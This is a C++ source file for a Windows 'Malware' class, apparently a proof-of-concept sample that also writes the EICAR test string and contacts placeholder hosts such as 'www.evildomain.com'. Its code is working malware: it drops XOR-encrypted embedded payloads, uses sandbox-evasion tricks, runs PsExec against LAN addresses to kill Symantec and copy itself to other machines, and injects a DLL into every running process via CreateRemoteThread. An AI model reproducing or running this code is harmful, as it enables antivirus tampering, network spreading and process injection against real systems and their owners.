#include "Malware.h"
#define NUMBER_OF_TARGETS	5


Malware::Malware()
{
	*(Malware*)this = Malware(true, true, true, true, true, true);
}

Malware::Malware(bool spreadInNetwork, bool injectDll, bool evadeAntiVirus, bool killAntiVirus, bool connectToMaliciousHost, bool eicar)
{
	
	this->spreadInNetwork = spreadInNetwork;
	this->injectDll = injectDll;
	this->evadeAntiVirus = evadeAntiVirus;
	this->KillAntiVirus = killAntiVirus;
	this->eicar = eicar;
	WSADATA wsa;
	if (WSAStartup(MAKEWORD(2, 2), &wsa) == 0)
		this->connectToMaliciousHost = connectToMaliciousHost;
}


bool Malware::execute()
{

	char dll_name[] = "malicious_code.dll";
	char psExecName[] = "PsExeMalware.exe";
	char tempPath[MAX_BUFFER + 1];

	ZeroMemory(tempPath, MAX_BUFFER + 1);
	GetTempPathA(MAX_BUFFER, (LPSTR)tempPath);
	
	
	char* buffer = new char[strlen(tempPath) + strlen(dll_name) + 1];
	if (!buffer)
	{
		std::cout << "Could not allocate memory\nThe Program Will exit...\n" << std::endl;
		return false;
	}
	ZeroMemory(buffer, strlen(tempPath) + strlen(dll_name) + 1);
	sprintf(buffer, "%s", tempPath);
	strncpy(buffer, tempPath, strlen(tempPath));
	createFileAndGetPathOfDll(buffer, dll_name);

	char* dll_path = new char[strlen(buffer) + 1];

	ZeroMemory(dll_path, strlen(buffer) + 1);

	strncpy(dll_path, buffer, strlen(buffer));
	delete[] buffer;

	buffer = NULL;

	if (this->evadeAntiVirus)
	{
		/* The "Offer you have to refuse" sandbox escape technique */
		int i;
		DWORD oneGigaByte = 1000000000;
		char* buffer = (char*)malloc(oneGigaByte);
		if (!buffer)
			abort();
		free(buffer);
		buffer = NULL;

		/* The "Hundread Million Increments" sandbox escape technique */
		int oneMillion = 100000000, count = 0;
		for (i = 0; i < oneMillion; i++)
		{
			count++;
		}
		if (count != oneMillion)
			abort();

		/* The "What the fuck is NUMA" sandbox escape technique */

		LPVOID mem = NULL;
		mem = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
		if (!mem)
			abort();


	}

	if (this->eicar)
	{
		std::string* payload = new std::string("echo ");
		payload->append("X5O!P%@AP[4\\PZX54(P^^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*> ");
		payload->append("eicar.txt");
		system(payload->c_str());
		delete payload;
	}


	if (this->connectToMaliciousHost)
	{
		sendPacketToIP("2.2.2.2", 80);
		sendPacketToDomain("www.evildomain.com", 80);
	}



	/*
	psExecHandler arguments are:
	-kA or --killav: kills symantec
	-kP or --killprocess [PROCESSNAME]: kill all instances of process by it's name
	-r or --remotecomputer [IP]: remote computer ip address
	-e or --executefile [PATH]: local file path to execute in the remote computer
	*/

	buffer = new char[strlen(tempPath) + strlen(psExecName) + 1];
	char* psExecPath = new char[strlen(buffer) + 1];
	if (!buffer || !psExecPath) /* If memory allocation failed, then network spreading module and antivirus module couldn't work :( */
	{
		this->spreadInNetwork = false;
		this->KillAntiVirus = false;
	}
	else
	{
		ZeroMemory(buffer, strlen(tempPath) + strlen(psExecName) + 1);
		ZeroMemory(psExecPath, strlen(buffer) + 1);
		strncpy(buffer, tempPath, strlen(tempPath));
		createFileAndGetPathOfPsExec(buffer, psExecName);
		strncpy(psExecPath, buffer, strlen(buffer));
		delete[] buffer;
		buffer = NULL;
	}
	char* ips[NUMBER_OF_TARGETS] = {    /* This is only for POC, you can implement a simple IP generation algorithm instead */
		"192.168.1.1",
		"192.168.1.2",
		"192.168.1.3",
		"192.168.1.4",
		"192.168.1.5"
	};

	if (this->KillAntiVirus)
	{
		int i;
		char* argument = new char[MAX_BUFFER + 1];
		for (i = 0; i < NUMBER_OF_TARGETS; i++)
		{
			int seconds = 20;
			int timeToSleep = seconds * 1000;
			ZeroMemory(argument, MAX_BUFFER + 1);
			sprintf(argument, "\"\"%s\" -r %s -kA\"", psExecPath, ips[i]);
			system((char*)argument);
			Sleep(timeToSleep);
		}

		delete[] argument;

	}

	if (this->spreadInNetwork)
	{
		int i;
		char* currentFilePath = new char[MAX_PATH + 1];
		ZeroMemory(currentFilePath, MAX_PATH + 1);
		GetModuleFileNameA(NULL, (LPSTR)currentFilePath, MAX_PATH);
		

		char* argument = new char[MAX_BUFFER + 1];

		for (i = 0; i < NUMBER_OF_TARGETS; i++)
		{
			int seconds = 20;
			int timeToSleep = seconds * 1000;
			ZeroMemory(argument, MAX_BUFFER + 1);
			sprintf(argument, "\"\"%s\" -r %s -e \"%s\"\"", psExecPath, ips[i], currentFilePath);
			system((char*)argument);
			Sleep(timeToSleep);
		}

		
		delete[] currentFilePath;
		delete[] argument;

	}



	if (psExecPath)
	{
		DeleteFileA((LPCSTR)psExecPath);
		delete[] psExecPath;
	}
	


	if (this->injectDll)
	{
		PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
		HANDLE hProcessSnap;
		hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (Process32First(hProcessSnap, &pe32))
		{
			do
			{
				execInjection(pe32.th32ProcessID, dll_path);
			} while (Process32Next(hProcessSnap, &pe32));
		}
		CloseHandle(hProcessSnap);
	}

	delete[] dll_path;
	return true;
}



bool Malware::sendPacketToIP(char* ip, int port)
{
	SOCKET s;
	struct sockaddr_in  server;
	char packet[] = "Packet 4 You";
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return false;
	server.sin_addr.s_addr = inet_addr(ip);
	server.sin_family = AF_INET;
	server.sin_port = htons(port);
	if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
		return false;
	if (send(s, packet, strlen(packet), 0) < 0)
		return false;
	//printf("Sent!");
	closesocket(s);
	return true;
}

bool Malware::sendPacketToDomain(std::string url, int port)
{
	SOCKET s;
	SOCKADDR_IN sAddr;
	struct hostent *host;
	std::string get_request = "GET / HTTP/1.1\r\nHost: " + url + "\r\nConnection: close\r\n\r\n";
	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	host = gethostbyname(url.c_str());
	sAddr.sin_port = htons(port);
	sAddr.sin_family = AF_INET;
	sAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
	if (connect(s, (SOCKADDR*)(&sAddr), sizeof(sAddr)) != 0)
		return false;
	send(s, get_request.c_str(), strlen(get_request.c_str()), 0);
	//printf("Sent!");
	closesocket(s);
	return true;
}


void Malware::xorCrypt(char* buffer, unsigned int bufLength, const char *key)
{
	int i, keyLength;
	keyLength = (int)strlen(key);
	for (i = 0; i < (int)bufLength - 1; i++)
	{
		buffer[i] ^= (int)(key[i % keyLength]);
	}
}

bool Malware::execInjection(int pid, char* dll_Path)
{
	HANDLE hProcess;
	HANDLE hRemote;
	LPVOID paramAddr;
	HINSTANCE hDLL = LoadLibraryA("KERNEL32");
	char* loadLibraryAddr = (char*)GetProcAddress(hDLL, "LoadLibraryA");

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
	if (!hProcess)
	{
		std::cout << "Couldn't Open Process with PID: " << pid << std::endl;
		return false;
	}
	paramAddr = VirtualAllocEx(hProcess, 0, strlen(dll_Path) + 1, MEM_COMMIT, PAGE_READWRITE);
	if (!paramAddr)
	{
		std::cout << "Couldn't Allocate Memory with PID: " << pid << std::endl;
		CloseHandle(hProcess);
		return false;
	}

	BOOL written = WriteProcessMemory(hProcess, paramAddr, dll_Path, strlen(dll_Path), NULL);
	if (!written)
	{
		std::cout << "Couldn't Write Memory with PID: " << pid << std::endl;
		CloseHandle(hProcess);
		return false;
	}
	try
	{
		hRemote = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, paramAddr, 0, 0);
		if (!hRemote)
		{
			std::cout << "Couldn't Create Remote Thread with PID: " << pid << std::endl;
			CloseHandle(hProcess);
			return false;
		}
	}
	catch (int e)
	{
		std::cout << "An Exception Occured During Injection to " << pid << ": " << e << std::endl;
		return false;
	}
	std::cout << "DLL injected successfully to PID: " << pid << std::endl;
	WaitForSingleObject(hRemote, INFINITE);
	CloseHandle(hRemote);
	CloseHandle(hProcess);
	return true;
}


void Malware::createFileAndGetPathOfDll(char* tempPath, const char* fileName)
{
	strncat(tempPath, fileName, strlen(fileName));
	HRSRC dllMalware = ::FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	unsigned int dllMalwareSize = ::SizeofResource(NULL, dllMalware);
	HGLOBAL dllMalwareData = ::LoadResource(NULL, dllMalware);
	void* dllMalwareBinary = ::LockResource(dllMalwareData);
	char* buffer = new char[dllMalwareSize];
	ZeroMemory(buffer, dllMalwareSize);
	memcpy(buffer, dllMalwareBinary, dllMalwareSize);

	xorCrypt(buffer, dllMalwareSize, KEY);

	std::ofstream output(tempPath, std::ofstream::binary);
	output.write(buffer, dllMalwareSize);
	delete[] buffer;
	output.close();
}

void Malware::createFileAndGetPathOfPsExec(char* tempPath, const char* fileName)
{
	strncat(tempPath, fileName, strlen(fileName));
	HRSRC ps = ::FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA2), RT_RCDATA);
	unsigned int psExecSize = ::SizeofResource(NULL, ps);
	HGLOBAL psExecData = ::LoadResource(NULL, ps);
	void* psExecBinary = ::LockResource(psExecData);
	char* buffer = new char[psExecSize];
	memcpy(buffer, psExecBinary, psExecSize);

	xorCrypt(buffer, psExecSize, KEY);
	std::ofstream output(tempPath, std::ofstream::binary);
	output.write(buffer, psExecSize);
	delete[] buffer;
	output.close();
}

Malware::~Malware()
{
}
